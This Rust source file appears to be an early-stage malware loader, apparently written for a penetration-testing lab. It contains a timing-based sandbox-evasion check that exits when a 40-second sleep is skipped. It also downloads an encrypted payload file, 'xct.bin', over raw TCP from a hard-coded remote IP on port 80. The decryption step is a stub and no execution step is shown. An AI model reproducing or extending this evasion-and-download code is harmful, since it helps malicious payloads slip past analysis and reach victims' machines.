use std::{
    error::Error, io::{Read, Write}, net::TcpStream, thread, time::{Duration, SystemTime},
};

const REMOTE_IP: &str = "10.10.14.16";
const REMOTE_PORT: &str = "80";
const FILE_PATH: &str = "xct.bin";

fn main() {
    wait(Duration::from_secs(40));
    let encrypted_data = download_file(REMOTE_IP, REMOTE_PORT, FILE_PATH).unwrap();
    let data = decrypt_data(encrypted_data);
}

fn wait(duration: Duration) {
    let start_time = SystemTime::now();
    thread::sleep(duration);
    let end_time = SystemTime::now();

    let elapsed = end_time.duration_since(start_time).unwrap_or(Duration::from_secs(0));
    if elapsed.as_secs_f64() <= duration.as_secs_f64() - 0.5f64 {
        std::process::exit(0);
    }
}

fn download_file(remote_ip: &str, remote_port: &str, path: &str) -> Result<Vec<u8>, Box<dyn Error>> {
    // Connect to the server
    let mut stream = TcpStream::connect(format!("{}:{}", remote_ip, remote_port))?;
    
    // Send HTTP GET request
    let request = format!("GET /{} HTTP/1.1\r\n\r\n", path);
    stream.write_all(request.as_bytes())?;
    
    // Read the response data
    let mut data = Vec::new();
    let mut buffer = [0; 512];
    
    loop {
        let num_bytes = stream.read(&mut buffer)?;
        if num_bytes == 0 {
            break; // Connection closed
        }
        data.extend_from_slice(&buffer[..num_bytes]);
    }
    
    Ok(data)
}

fn decrypt_data(data: Vec<u8>) -> Vec<u8> {
    // Placeholder for decryption logic
    data
}

